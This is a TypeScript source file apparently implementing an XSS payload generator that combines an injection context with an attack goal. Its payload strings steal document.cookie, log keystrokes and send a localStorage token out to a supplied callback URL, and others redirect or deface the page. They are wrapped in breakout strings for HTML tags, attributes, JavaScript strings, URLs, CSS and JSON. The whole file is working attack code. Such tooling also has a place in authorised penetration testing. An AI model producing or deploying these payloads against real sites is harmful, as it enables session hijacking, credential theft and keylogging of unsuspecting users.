export type InjectionContext = 'html-tag' | 'html-attr-quoted' | 'html-attr-unquoted' | 'js-string-single' | 'js-string-double' | 'js-template' | 'url-param' | 'css' | 'json';
export type PayloadGoal = 'alert' | 'cookie' | 'keylogger' | 'redirect' | 'dom' | 'exfil';

export interface GeneratorOptions {
  context: InjectionContext;
  goal: PayloadGoal;
  callbackUrl: string;
  customJs: string;
}

export function generatePayloads(options: GeneratorOptions): string[] {
  const { context, goal, callbackUrl, customJs } = options;
  
  let jsPayload = 'alert(1)';
  
  switch (goal) {
    case 'alert':
      jsPayload = customJs || 'alert(1)';
      break;
    case 'cookie':
      jsPayload = `fetch('${callbackUrl}?c='+btoa(document.cookie))`;
      break;
    case 'keylogger':
      jsPayload = `document.onkeypress=function(e){fetch('${callbackUrl}?k='+e.key)}`;
      break;
    case 'redirect':
      jsPayload = `window.location.href='${callbackUrl}'`;
      break;
    case 'dom':
      jsPayload = `document.body.innerHTML='<h1>Hacked</h1>'`;
      break;
    case 'exfil':
      jsPayload = `new Image().src='${callbackUrl}?d='+localStorage.getItem('token')`;
      break;
  }

  const results: string[] = [];

  switch (context) {
    case 'html-tag':
      results.push(`<script>${jsPayload}</script>`);
      results.push(`<img src=x onerror="${jsPayload}">`);
      results.push(`<svg onload="${jsPayload}">`);
      results.push(`<body onload="${jsPayload}">`);
      break;
    case 'html-attr-quoted':
      results.push(`"><script>${jsPayload}</script>`);
      results.push(`" autofocus onfocus="${jsPayload}" x="`);
      results.push(`" onmouseover="${jsPayload}" x="`);
      results.push(`"><svg onload="${jsPayload}">`);
      break;
    case 'html-attr-unquoted':
      results.push(`><script>${jsPayload}</script>`);
      results.push(`autofocus onfocus=${jsPayload}`);
      results.push(`onmouseover=${jsPayload}`);
      break;
    case 'js-string-single':
      results.push(`';${jsPayload}//`);
      results.push(`'-${jsPayload}-'`);
      results.push(`');${jsPayload}//`);
      break;
    case 'js-string-double':
      results.push(`";${jsPayload}//`);
      results.push(`"-${jsPayload}-"`);
      results.push(`");${jsPayload}//`);
      break;
    case 'js-template':
      results.push(`\${${jsPayload}}`);
      results.push(`\`+${jsPayload}+\``);
      break;
    case 'url-param':
      results.push(`javascript:${jsPayload}`);
      results.push(`data:text/html,<script>${jsPayload}</script>`);
      break;
    case 'css':
      results.push(`}</style><script>${jsPayload}</script>`);
      results.push(`expression(${jsPayload})`);
      break;
    case 'json':
      results.push(`"}], "x": ${jsPayload}}`);
      results.push(`{"<img src=x onerror=${jsPayload}>":"1"}`);
      break;
  }

  return results;
}